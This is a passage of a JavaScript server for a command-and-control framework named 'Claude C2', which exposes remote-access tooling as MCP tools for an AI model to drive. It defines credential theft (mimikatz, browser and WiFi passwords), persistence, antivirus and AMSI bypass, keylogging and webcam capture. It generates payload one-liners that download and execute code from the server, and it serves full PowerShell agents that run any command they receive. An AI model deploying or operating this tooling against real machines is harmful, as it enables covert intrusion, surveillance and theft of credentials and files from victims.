      else if (name === 'tool_docs') {
        const toolDocs = {
          // Execution
          shell: { description: 'Execute shell command', params: { client_id: 'Target client', cmd: 'Command to run' }, example: 'shell(client_id="LAPTOP01", cmd="whoami")' },
          powershell: { description: 'Execute PowerShell on Windows', params: { client_id: 'Target', cmd: 'PS command', bypass_amsi: 'Bypass AMSI first' }, example: 'powershell(client_id="WIN10", cmd="Get-Process")' },

          // Recon
          sysinfo: { description: 'Get system info (OS, hardware, domain)', params: { client_id: 'Target' }, returns: 'hostname, platform, arch, version, user, domain' },
          netinfo: { description: 'Get network config', params: { client_id: 'Target' }, returns: 'adapters, IPs, routes, ARP, connections' },

          // Files
          ls: { description: 'List directory', params: { client_id: 'Target', path: 'Directory (optional)' } },
          cat: { description: 'Read file', params: { client_id: 'Target', path: 'File path' } },
          download: { description: 'Download from client to C2', params: { client_id: 'Target', remote_path: 'File on client', local_path: 'Save location (optional)' } },

          // Creds
          browser_creds: { description: 'Extract browser passwords', params: { client_id: 'Target', browser: 'chrome/firefox/edge/all' } },
          wifi_passwords: { description: 'Get saved WiFi passwords', params: { client_id: 'Target' } },
          mimikatz: { description: 'Run Mimikatz', params: { client_id: 'Target', cmd: 'Mimikatz command' }, example: 'mimikatz(client_id="DC01", cmd="sekurlsa::logonpasswords")' },

          // Persistence
          persist_registry: { description: 'Registry run key', params: { client_id: 'Target', name: 'Key name', command: 'Command to run', hive: 'HKCU or HKLM' } },
          persist_schtask: { description: 'Scheduled task', params: { client_id: 'Target', name: 'Task name', command: 'Command', trigger: 'onlogon/daily/hourly' } },

          // Categories
          execution: ['shell', 'powershell', 'execute_assembly'],
          recon: ['sysinfo', 'netinfo', 'pslist', 'services', 'installed_software', 'scheduled_tasks', 'startup_programs', 'domain_info', 'local_users', 'shares'],
          files: ['ls', 'cat', 'write', 'download', 'upload', 'rm', 'mkdir', 'cp', 'mv', 'search', 'zip'],
          creds: ['hashdump', 'mimikatz', 'browser_creds', 'wifi_passwords', 'vault_creds'],
          persist: ['persist_registry', 'persist_schtask', 'persist_service', 'persist_startup', 'persist_wmi', 'persist_list', 'persist_remove'],
          privesc: ['privesc_check', 'getsystem', 'bypassuac', 'runas'],
          lateral: ['portscan', 'netscan', 'psexec', 'wmiexec', 'winrm', 'ssh_exec'],
          evasion: ['amsi_bypass', 'etw_patch', 'defender_exclude', 'defender_status', 'firewall_status', 'firewall_rule', 'timestomp'],
          surveillance: ['screenshot', 'webcam', 'keylog_start', 'keylog_dump', 'keylog_stop', 'clipboard']
        };

        const tool = args.tool.toLowerCase();
        if (toolDocs[tool]) {
          result = { content: [{ type: 'text', text: JSON.stringify(toolDocs[tool], null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify({ error: 'Tool not found', available_categories: Object.keys(toolDocs).filter(k => Array.isArray(toolDocs[k])) }, null, 2) }] };
        }
      }

      // === PAYLOAD GENERATION ===
      else if (name === 'get_payload') {
        try {
          const mcpRoot = '/home/iozac/claude-c2';
          const platform = args.platform.toLowerCase();
          const format = args.format || 'oneliner';
          const secret = config.clientAuthSecret;
          const serverUrl = 'ws://${DOMAIN}:3103';
          const httpUrl = 'https://${DOMAIN}';

          let payload = {};

          if (platform === 'windows') {
            if (format === 'oneliner') {
              payload.oneliner = `irm ${httpUrl}/agent/windows | iex`;
              payload.oneliner_custom_id = `$env:MCP_ID='${args.custom_id || 'YOURPC'}'; irm ${httpUrl}/agent/windows | iex`;
            }
            if (format === 'script' || format === 'oneliner') {
              payload.script = fs.readFileSync(path.join(mcpRoot, 'agents/windows.ps1'), 'utf8').replace(/AGENT_SECRET_PLACEHOLDER/g, secret);
            }
            if (format === 'encoded') {
              const script = fs.readFileSync(path.join(mcpRoot, 'agents/windows.ps1'), 'utf8').replace(/AGENT_SECRET_PLACEHOLDER/g, secret);
              const encoded = Buffer.from(script, 'utf16le').toString('base64');
              payload.encoded = `powershell -e ${encoded}`;
            }
          } else if (platform === 'linux') {
            if (format === 'oneliner') {
              payload.oneliner = `curl -s ${httpUrl}/agent/linux | bash`;
              payload.oneliner_custom_id = `MCP_ID='${args.custom_id || 'MYSERVER'}' bash -c "$(curl -s ${httpUrl}/agent/linux)"`;
            }
            if (format === 'script' || format === 'oneliner') {
              payload.script = fs.readFileSync(path.join(mcpRoot, 'agents/linux.sh'), 'utf8').replace(/AGENT_SECRET_PLACEHOLDER/g, secret);
            }
          } else if (platform === 'macos') {
            if (format === 'oneliner') {
              payload.oneliner = `curl -s ${httpUrl}/agent/macos | bash`;
            }
            if (format === 'script' || format === 'oneliner') {
              payload.script = fs.readFileSync(path.join(mcpRoot, 'agents/macos.sh'), 'utf8').replace(/AGENT_SECRET_PLACEHOLDER/g, secret);
            }
          } else if (platform === 'termux' || platform === 'android') {
            if (format === 'oneliner') {
              payload.oneliner = `curl -s ${httpUrl}/agent/termux | bash`;
            }
            if (format === 'script' || format === 'oneliner') {
              payload.script = fs.readFileSync(path.join(mcpRoot, 'agents/termux.sh'), 'utf8').replace(/AGENT_SECRET_PLACEHOLDER/g, secret);
            }
          } else if (platform === 'python') {
            if (format === 'oneliner') {
              payload.oneliner = `curl -s ${httpUrl}/agent/python -o /tmp/a.py && python3 /tmp/a.py`;
            }
            if (format === 'script' || format === 'oneliner') {
              payload.script = fs.readFileSync(path.join(mcpRoot, 'agents/agent.py'), 'utf8').replace(/AGENT_SECRET_PLACEHOLDER/g, secret);
            }
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'Unknown platform. Use: windows, linux, macos, termux, python' }, null, 2) }] };
            return;
          }

          payload.platform = platform;
          payload.server = serverUrl;
          payload.download_url = `${httpUrl}/agent/${platform}`;

          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, ...payload }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'generate_payload') {
        try {
          const platform = args.platform.toLowerCase();
          const options = args.options || {};
          const secret = config.clientAuthSecret;
          const serverUrl = options.server || 'ws://${DOMAIN}:3103';
          const clientId = options.id || '$env:COMPUTERNAME';

          let payload = '';

          if (platform === 'windows') {
            payload = `# Claude C2 - Windows
# Generated: ${new Date().toISOString()}
param([string]$Server = "${serverUrl}", [string]$Secret = "${secret}", [string]$Id = ${clientId})

$ws = New-Object Net.WebSockets.ClientWebSocket
$null = $ws.ConnectAsync($Server, [Threading.CancellationToken]::None).GetAwaiter().GetResult()

$reg = @{type="register";clientId=$Id;authSecret=$Secret;hostname=$env:COMPUTERNAME;platform="Windows";arch=$env:PROCESSOR_ARCHITECTURE;username=$env:USERNAME} | ConvertTo-Json -Compress
$bytes = [Text.Encoding]::UTF8.GetBytes($reg)
$null = $ws.SendAsync([ArraySegment[byte]]::new($bytes), [Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).GetAwaiter().GetResult()

$buf = [byte[]]::new(65536)
while($ws.State -eq 'Open') {
    $res = $ws.ReceiveAsync([ArraySegment[byte]]::new($buf), [Threading.CancellationToken]::None).GetAwaiter().GetResult()
    $msg = [Text.Encoding]::UTF8.GetString($buf, 0, $res.Count) | ConvertFrom-Json
    if($msg.type -eq 'ping') {
        $pong = [Text.Encoding]::UTF8.GetBytes('{"type":"pong"}')
        $null = $ws.SendAsync([ArraySegment[byte]]::new($pong), [Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
    }
    elseif($msg.type -eq 'command') {
        $r = switch($msg.command) {
            'shell' { try { @{success=$true;stdout=(iex $msg.args.cmd 2>&1|Out-String)} } catch { @{success=$false;error="$_"} } }
            default { @{success=$false;error="Unknown"} }
        }
        $resp = @{type="command_response";commandId=$msg.commandId;result=$r} | ConvertTo-Json -Compress -Depth 5
        $rbytes = [Text.Encoding]::UTF8.GetBytes($resp)
        $null = $ws.SendAsync([ArraySegment[byte]]::new($rbytes), [Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
    }
}`;
          } else {
            payload = `# Use get_payload for full ${platform} payload`;
          }

          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, platform, payload, note: 'This is a minimal payload. Use get_payload for full-featured agent.' }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      else if (name === 'list_payloads') {
        const payloads = {
          platforms: {
            windows: {
              description: 'Windows PowerShell agent',
              features: ['shell', 'powershell', 'file ops', 'screenshot', 'keylogger', 'persistence', 'credentials'],
              requirements: 'PowerShell 5.1+ (built-in on Win10/11)',
              deployment: 'irm https://${DOMAIN}/agent/windows | iex'
            },
            linux: {
              description: 'Linux Bash/Python agent',
              features: ['shell', 'file ops', 'screenshot (if X11)', 'persistence'],
              requirements: 'Python 3.7+ with websockets',
              deployment: 'curl -s https://${DOMAIN}/agent/linux | bash'
            },
            macos: {
              description: 'macOS agent',
              features: ['shell', 'file ops', 'screenshot', 'notifications'],
              requirements: 'Python 3.7+ with websockets',
              deployment: 'curl -s https://${DOMAIN}/agent/macos | bash'
            },
            termux: {
              description: 'Android Termux agent',
              features: ['shell', 'file ops', 'app launch', 'Termux:API integration'],
              requirements: 'Termux with Python',
              deployment: 'curl -s https://${DOMAIN}/agent/termux | bash'
            },
            python: {
              description: 'Cross-platform Python agent',
              features: ['shell', 'file ops', 'platform detection', 'screenshot'],
              requirements: 'Python 3.7+ with websockets',
              deployment: 'curl -s https://${DOMAIN}/agent/python -o a.py && python3 a.py'
            }
          },
          formats: ['oneliner', 'script', 'encoded'],
          tools: ['get_payload', 'generate_payload']
        };
        result = { content: [{ type: 'text', text: JSON.stringify(payloads, null, 2) }] };
      }

      // === LOOT MANAGEMENT ===
      else if (name === 'loot_list') {
        if (!fs.existsSync(lootDir)) fs.mkdirSync(lootDir, { recursive: true });
        const files = fs.readdirSync(lootDir).map(f => {
          const stat = fs.statSync(path.join(lootDir, f));
          return { name: f, size: stat.size, modified: stat.mtime };
        });
        result = { content: [{ type: 'text', text: JSON.stringify({ success: true, loot: files }, null, 2) }] };
      } else if (name === 'loot_download') {
        const filepath = path.join(lootDir, args.filename);
        if (fs.existsSync(filepath)) {
          const content = fs.readFileSync(filepath, 'utf8');
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, filename: args.filename, content }, null, 2) }] };
        } else {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'File not found' }, null, 2) }] };
        }
      }
      // Screenshot tool
      else if (name === 'take_screenshot') {
        try {
          const screenshotDir = '/home/iozac/screenshots';
          if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });

          const cmdResult = await clientManager.sendCommand(args.client_id, 'screenshot', {}, 60000);
          if (cmdResult.success && cmdResult.base64) {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = args.save_path || path.join(screenshotDir, `screenshot_${args.client_id}_${timestamp}.png`);
            fs.writeFileSync(filename, Buffer.from(cmdResult.base64, 'base64'));
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, message: 'Screenshot saved', path: filename, size: fs.statSync(filename).size }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: cmdResult.error || 'Screenshot failed' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      // File transfer: Download from client
      else if (name === 'download_from_client') {
        try {
          const downloadDir = '/home/iozac/downloads';
          if (!fs.existsSync(downloadDir)) fs.mkdirSync(downloadDir, { recursive: true });

          const cmdResult = await clientManager.sendCommand(args.client_id, 'file_read', { path: args.remote_path }, 60000);
          if (cmdResult.success && cmdResult.content !== undefined) {
            const filename = args.local_path || path.join(downloadDir, path.basename(args.remote_path));
            fs.writeFileSync(filename, cmdResult.content);
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, message: 'File downloaded', remote: args.remote_path, local: filename, size: fs.statSync(filename).size }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: cmdResult.error || 'Download failed' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      // File transfer: Upload to client
      else if (name === 'upload_to_client') {
        try {
          const content = fs.readFileSync(args.local_path, 'utf8');
          const cmdResult = await clientManager.sendCommand(args.client_id, 'file_write', { path: args.remote_path, content }, 60000);
          if (cmdResult.success) {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: true, message: 'File uploaded', local: args.local_path, remote: args.remote_path }, null, 2) }] };
          } else {
            result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: cmdResult.error || 'Upload failed' }, null, 2) }] };
          }
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      }
      // Local server tools - FULL PERMISSIONS, NO SANDBOX
      else if (name === 'server_shell') {
        try {
          const timeout = args.timeout || 120000; // 2 min default, can be extended
          const { stdout, stderr } = await execAsync(args.command, {
            cwd: args.cwd || '/home/iozac',
            timeout: timeout,
            maxBuffer: 50 * 1024 * 1024, // 50MB buffer
            shell: '/bin/bash',
            env: { ...process.env, HOME: '/home/iozac', USER: 'iozac' }
          });
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, stdout, stderr }, null, 2) }] };
        } catch (err) {
          // Even on error, return output if available
          result = { content: [{ type: 'text', text: JSON.stringify({
            success: false,
            error: err.message,
            stderr: err.stderr || '',
            stdout: err.stdout || '',
            code: err.code,
            hint: 'Try adding sudo if permission denied'
          }, null, 2) }] };
        }
      } else if (name === 'server_file_read') {
        try {
          const content = fs.readFileSync(args.path, 'utf8');
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, content }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      } else if (name === 'server_file_write') {
        try {
          // Create parent directories if they don't exist
          const dir = path.dirname(args.path);
          if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
          }
          fs.writeFileSync(args.path, args.content);
          const stat = fs.statSync(args.path);
          result = { content: [{ type: 'text', text: JSON.stringify({
            success: true,
            message: 'File written',
            path: args.path,
            size: stat.size,
            created_dirs: !fs.existsSync(dir) ? dir : null
          }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({
            success: false,
            error: err.message,
            hint: err.code === 'EACCES' ? 'Permission denied. Try using server_shell with sudo.' : null
          }, null, 2) }] };
        }
      } else if (name === 'server_file_list') {
        try {
          const dirPath = args.path || '.';
          const files = fs.readdirSync(dirPath).map(name => {
            const fullPath = path.join(dirPath, name);
            const stat = fs.statSync(fullPath);
            return { name, type: stat.isDirectory() ? 'dir' : 'file', size: stat.size };
          });
          result = { content: [{ type: 'text', text: JSON.stringify({ success: true, path: dirPath, files }, null, 2) }] };
        } catch (err) {
          result = { content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] };
        }
      } else if (name === 'server_info') {
        result = { content: [{ type: 'text', text: JSON.stringify({
          success: true,
          hostname: os.hostname(),
          platform: os.platform(),
          arch: os.arch(),
          release: os.release(),
          uptime: os.uptime(),
          totalMemory: os.totalmem(),
          freeMemory: os.freemem(),
          cpus: os.cpus().length,
          user: os.userInfo().username,
          homeDir: os.homedir(),
          cwd: process.cwd()
        }, null, 2) }] };
      } else {
        result = { content: [{ type: 'text', text: JSON.stringify({ error: 'Unknown tool: ' + name }) }] };
      }
    } else {
      result = {};
    }

    res.json({ jsonrpc: '2.0', id, result });
  } catch (err) {
    log('[MCP] Error: ' + err.message);
    res.json({ jsonrpc: '2.0', id, error: { code: -32000, message: err.message } });
  }
});

// MCP tools handler
app.post('/mcp/messages', async (req, res) => {
  const { method, params } = req.body;

  if (method === 'tools/list') {
    return res.json({
      tools: [
        { name: 'list_remote_clients', description: 'List all connected remote clients', inputSchema: { type: 'object', properties: {} } },
        { name: 'send_remote_command', description: 'Send a command to a remote client', inputSchema: { type: 'object', properties: { client_id: { type: 'string' }, command: { type: 'string' }, args: { type: 'object' } }, required: ['client_id', 'command'] } },
      ]
    });
  }

  if (method === 'tools/call') {
    const { name, arguments: args } = params;
    try {
      if (name === 'list_remote_clients') {
        return res.json({ content: [{ type: 'text', text: JSON.stringify({ success: true, clients: clientManager.getActiveClients() }, null, 2) }] });
      }
      if (name === 'send_remote_command') {
        const result = await clientManager.sendCommand(args.client_id, args.command, args.args || {}, 30000);
        return res.json({ content: [{ type: 'text', text: JSON.stringify({ success: true, result }, null, 2) }] });
      }
    } catch (err) {
      return res.json({ content: [{ type: 'text', text: JSON.stringify({ success: false, error: err.message }, null, 2) }] });
    }
  }

  res.status(400).json({ error: 'Unknown method' });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString(), clients: clientManager.getActiveClients().length });
});

// Agent download endpoints
app.get('/agent/windows', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  const content = fs.readFileSync('agents/windows.ps1', 'utf8')
    .replace(/AGENT_SECRET_PLACEHOLDER/g, config.clientAuthSecret)
    .replace(/\$\{DOMAIN\}/g, DOMAIN);
  res.send(content);
});

app.get('/agent/linux', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  const content = fs.readFileSync('agents/linux.sh', 'utf8')
    .replace(/AGENT_SECRET_PLACEHOLDER/g, config.clientAuthSecret)
    .replace(/\$\{DOMAIN\}/g, DOMAIN);
  res.send(content);
});

app.get('/agent/macos', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  const content = fs.readFileSync('agents/macos.sh', 'utf8')
    .replace(/AGENT_SECRET_PLACEHOLDER/g, config.clientAuthSecret)
    .replace(/\$\{DOMAIN\}/g, DOMAIN);
  res.send(content);
});

app.get('/agent/termux', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  const content = fs.readFileSync('agents/termux.sh', 'utf8')
    .replace(/AGENT_SECRET_PLACEHOLDER/g, config.clientAuthSecret)
    .replace(/\$\{DOMAIN\}/g, DOMAIN);
  res.send(content);
});

app.get('/agent/python', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  const content = fs.readFileSync('agents/agent.py', 'utf8')
    .replace(/AGENT_SECRET_PLACEHOLDER/g, config.clientAuthSecret)
    .replace(/\$\{DOMAIN\}/g, DOMAIN);
  res.send(content);
});

// Agent index page
app.get('/agents', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.sendFile('agents/index.html', { root: '.' });
});

// Test endpoints
app.get('/test/clients', (req, res) => res.json(clientManager.getActiveClients()));
app.post('/test/command', async (req, res) => {
  const { client_id, command, args = {} } = req.body;
  try {
    const result = await clientManager.sendCommand(client_id, command, args, 30000);
    res.json({ success: true, result });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// PowerShell agent endpoint
app.get('/agent.ps1', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');
  const secret = config.clientAuthSecret;
  res.send(`# Claude C2 v2.0
param([string]$Server = "ws://${DOMAIN}:3103", [string]$Secret = "${secret}", [string]$Id = $env:COMPUTERNAME)

$script:cmdCount = 0

function Show-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  ���W   ���W ������W������W     ������W �������W���W   ���W ������W ��������W�������W" -F Magenta
    Write-Host "  ����W ����Q��TPPPP]��TPP��W    ��TPP��W��TPPPP]����W ����Q��TPPP��WZPP��TPP]��TPPPP]" -F Magenta
    Write-Host "  ��T����T��Q��Q     ������T]    ������T]�����W  ��T����T��Q��Q   ��Q   ��Q   �����W  " -F Cyan
    Write-Host "  ��QZ��T]��Q��Q     ��TPPP]     ��TPP��W��TPP]  ��QZ��T]��Q��Q   ��Q   ��Q   ��TPP]  " -F Cyan
    Write-Host "  ��Q ZP] ��QZ������W��Q         ��Q  ��Q�������W��Q ZP] ��QZ������T]   ��Q   �������W" -F Magenta
    Write-Host "  ZP]     ZP] ZPPPPP]ZP]         ZP]  ZP]ZPPPPPP]ZP]     ZP] ZPPPPP]    ZP]   ZPPPPPP]" -F Magenta
    Write-Host ""
    Write-Host "                          TPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPW" -F DarkGray
    Write-Host "                          Q    " -F DarkGray -NoNewline; Write-Host "AGENT CONTROL SYSTEM" -F Yellow -NoNewline; Write-Host "     Q" -F DarkGray
    Write-Host "                          ZPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP]" -F DarkGray
    Write-Host ""
}

function Show-Status([string]$Status, [string]$Color = "White") {
    $t = Get-Date -Format "HH:mm:ss"
    Write-Host "                                                               " -F DarkGray
    Write-Host "   " -F DarkGray -NoNewline; Write-Host "AGENT" -F Cyan -NoNewline; Write-Host "     : " -F DarkGray -NoNewline; Write-Host $Id.PadRight(48) -F White -NoNewline; Write-Host "" -F DarkGray
    Write-Host "   " -F DarkGray -NoNewline; Write-Host "HOST" -F Cyan -NoNewline; Write-Host "      : " -F DarkGray -NoNewline; Write-Host $env:COMPUTERNAME.PadRight(48) -F White -NoNewline; Write-Host "" -F DarkGray
    Write-Host "   " -F DarkGray -NoNewline; Write-Host "USER" -F Cyan -NoNewline; Write-Host "      : " -F DarkGray -NoNewline; Write-Host "$env:USERDOMAIN\\$env:USERNAME".PadRight(48) -F White -NoNewline; Write-Host "" -F DarkGray
    Write-Host "   " -F DarkGray -NoNewline; Write-Host "STATUS" -F Cyan -NoNewline; Write-Host "    : " -F DarkGray -NoNewline; Write-Host $Status.PadRight(48) -F $Color -NoNewline; Write-Host "" -F DarkGray
    Write-Host "   " -F DarkGray -NoNewline; Write-Host "COMMANDS" -F Cyan -NoNewline; Write-Host "  : " -F DarkGray -NoNewline; Write-Host "$script:cmdCount executed".PadRight(48) -F White -NoNewline; Write-Host "" -F DarkGray
    Write-Host "   " -F DarkGray -NoNewline; Write-Host "TIME" -F Cyan -NoNewline; Write-Host "      : " -F DarkGray -NoNewline; Write-Host $t.PadRight(48) -F White -NoNewline; Write-Host "" -F DarkGray
    Write-Host "                                                               " -F DarkGray
    Write-Host ""
}

function Log([string]$M, [string]$T = "INFO") {
    $time = Get-Date -Format "HH:mm:ss"
    $sym = @{INFO="*";OK="+";WARN="!";ERR="-";CMD=">";DONE="<"}
    $col = @{INFO="Cyan";OK="Green";WARN="Yellow";ERR="Red";CMD="Magenta";DONE="Green"}
    Write-Host "  $time [" -F DarkGray -NoNewline
    Write-Host $sym[$T] -F $col[$T] -NoNewline
    Write-Host "] " -F DarkGray -NoNewline
    Write-Host $M -F $col[$T]
}

function Run($c,$a) {
    switch($c) {
        "shell" { try{$o=iex $a.cmd 2>&1|Out-String;@{success=$true;stdout=$o;exitCode=0}}catch{@{success=$false;stderr="$_";exitCode=1}} }
        "powershell" { try{$o=iex $a.cmd 2>&1|Out-String;@{success=$true;output=$o}}catch{@{success=$false;error="$_"}} }
        "file_read" { try{@{success=$true;content=[IO.File]::ReadAllText($a.path)}}catch{@{success=$false;error="$_"}} }
        "file_write" { try{[IO.File]::WriteAllText($a.path,$a.content);@{success=$true}}catch{@{success=$false;error="$_"}} }
        "file_list" { try{$p=if($a.path){$a.path}else{"."};@{success=$true;files=@(gci $p|%{@{name=$_.Name;type=$(if($_.PSIsContainer){"dir"}else{"file"});size=$_.Length}})}}catch{@{success=$false;error="$_"}} }
        "system_info" { $os=gcim Win32_OperatingSystem;@{success=$true;hostname=$env:COMPUTERNAME;platform="Windows";arch=$env:PROCESSOR_ARCHITECTURE;version=$os.Version;user=$env:USERNAME} }
        "process_list" { @{success=$true;processes=@(gps|select -f 50|%{@{name=$_.Name;pid=$_.Id;mem=$_.WorkingSet64}})} }
        "status" { @{success=$true;id=$Id;host=$env:COMPUTERNAME;time="$(Get-Date -f o)"} }
        default { @{success=$false;error="Unknown: $c"} }
    }
}

Show-Banner
Log "Initializing agent..." "INFO"
Log "Target server: $Server" "INFO"
Write-Host ""

while($true) {
    $ws = $null
    try {
        Log "Establishing connection..." "INFO"
        $ws = New-Object Net.WebSockets.ClientWebSocket
        $null = $ws.ConnectAsync($Server,[Threading.CancellationToken]::None).GetAwaiter().GetResult()
        Log "Connection established" "OK"

        $msg = (@{type="register";clientId=$Id;authSecret=$Secret;hostname=$env:COMPUTERNAME;platform="Windows";arch=$env:PROCESSOR_ARCHITECTURE;username=$env:USERNAME}|ConvertTo-Json -Compress)
        $bytes = [Text.Encoding]::UTF8.GetBytes($msg)
        $null = $ws.SendAsync([ArraySegment[byte]]::new($bytes),[Net.WebSockets.WebSocketMessageType]::Text,$true,[Threading.CancellationToken]::None).GetAwaiter().GetResult()

        $buf = [byte[]]::new(65536)

        while($ws.State -eq 'Open') {
            try {
                $seg = [ArraySegment[byte]]::new($buf)
                $res = $ws.ReceiveAsync($seg,[Threading.CancellationToken]::None).GetAwaiter().GetResult()
                if($res.MessageType -eq 'Close') { Log "Server closed connection" "WARN"; break }
                $json = [Text.Encoding]::UTF8.GetString($buf,0,$res.Count)
                $m = $json | ConvertFrom-Json

                switch($m.type) {
                    "registered" {
                        Log "Successfully registered as '$($m.clientId)'" "OK"
                        Write-Host ""
                        Show-Status "ONLINE - Awaiting Commands" "Green"
                    }
                    "ping" {
                        $pong = '{"type":"pong"}'
                        $pbytes = [Text.Encoding]::UTF8.GetBytes($pong)
                        $null = $ws.SendAsync([ArraySegment[byte]]::new($pbytes),[Net.WebSockets.WebSocketMessageType]::Text,$true,[Threading.CancellationToken]::None).GetAwaiter().GetResult()
                    }
                    "command" {
                        $script:cmdCount++
                        Write-Host ""
                        Write-Host "  TPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPW" -F Yellow
                        Write-Host "  Q  INCOMING COMMAND                                            Q" -F Yellow
                        Write-Host "  ZPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP]" -F Yellow
                        Log "Command: $($m.command)" "CMD"
                        if($m.args.cmd) { Log "Payload: $($m.args.cmd)" "INFO" }
                        elseif($m.args.path) { Log "Target: $($m.args.path)" "INFO" }
                        $result = Run $m.command $m.args
                        $resp = (@{type="command_response";commandId=$m.commandId;result=$result}|ConvertTo-Json -Compress -Depth 5)
                        $rbytes = [Text.Encoding]::UTF8.GetBytes($resp)
                        $null = $ws.SendAsync([ArraySegment[byte]]::new($rbytes),[Net.WebSockets.WebSocketMessageType]::Text,$true,[Threading.CancellationToken]::None).GetAwaiter().GetResult()
                        if($result.success) {
                            Log "Result: SUCCESS" "OK"
                            if($result.stdout) {
                                Write-Host "    Output                                                       " -F DarkGray
                                $result.stdout.TrimEnd() -split "\`r?\`n" | ForEach-Object { Write-Host "   $_" -F White }
                                Write-Host "                                                                  " -F DarkGray
                            }
                        } else {
                            Log "Result: FAILED - $($result.error)" "ERR"
                        }
                        Write-Host ""
                    }
                }
            } catch { Log $_.Exception.Message "ERR"; break }
        }
    } catch { Log "Connection error: $_" "ERR" }
    finally { if($ws) { try{$ws.Dispose()}catch{} } }
    Write-Host ""
    Show-Status "DISCONNECTED" "Red"
    Log "Reconnecting in 5 seconds..." "WARN"
    Start-Sleep 5
    Show-Banner
}
`);
});

// WebSocket server
const wss = new WebSocketServer({ port: config.wsPort });
log(`[WebSocket] Server started on port ${config.wsPort}`);

wss.on('connection', (ws, req) => {
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  log(`[WebSocket] New connection from ${clientIp}`);
  let clientId = null;
  let pingInterval = null;

  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      log(`[WebSocket] Message from ${clientIp}: ${msg.type}`);

      if (msg.type === 'register') {
        log(`[WebSocket] Register attempt: clientId=${msg.clientId}, secret=${msg.authSecret?.substring(0,8)}...`);
        if (msg.authSecret !== config.clientAuthSecret) {
          log(`[WebSocket] Invalid auth secret! Expected: ${config.clientAuthSecret.substring(0,8)}...`);
          ws.close(4001, 'Invalid auth secret');
          return;
        }
        clientId = msg.clientId || `client-${Date.now()}`;
        clientManager.register(clientId, ws, {
          hostname: msg.hostname,
          platform: msg.platform,
          arch: msg.arch,
          username: msg.username,
          ip: clientIp,
          registeredAt: new Date().toISOString(),
        });
        log(`[ClientManager] Client registered: ${clientId}`);
        ws.send(JSON.stringify({ type: 'registered', clientId, message: 'Successfully registered with server' }));

        // Start server-side ping
        pingInterval = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping' }));
          } else {
            clearInterval(pingInterval);
          }
        }, 15000);
      }

      if (msg.type === 'command_response') {
        clientManager.handleCommandResponse(msg.commandId, msg.result);
      }

      if (msg.type === 'pong' && clientId) {
        const client = clientManager.clients.get(clientId);
        if (client) client.lastSeen = new Date();
      }
    } catch (err) {
      log(`[WebSocket] Error: ${err.message}`);
    }
  });

  ws.on('close', (code, reason) => {
    log(`[WebSocket] Connection closed from ${clientIp}: code=${code}, reason=${reason || 'none'}`);
    if (clientId) {
      clientManager.unregister(clientId);
      log(`[ClientManager] Client disconnected: ${clientId}`);
    }
    if (pingInterval) clearInterval(pingInterval);
  });

  ws.on('error', (err) => log(`[WebSocket] Error: ${err.message}`));
});

// Start HTTP server
const server = app.listen(config.port, () => {
  log(`[Server] HTTP server running on port ${config.port}`);
  log(`[Server] MCP SSE endpoint: http://localhost:${config.port}/mcp/sse`);
  log(`[Server] OAuth authorize: http://localhost:${config.port}/oauth/authorize`);
  log(`[Server] OAuth token: http://localhost:${config.port}/oauth/token`);
});

// Graceful shutdown
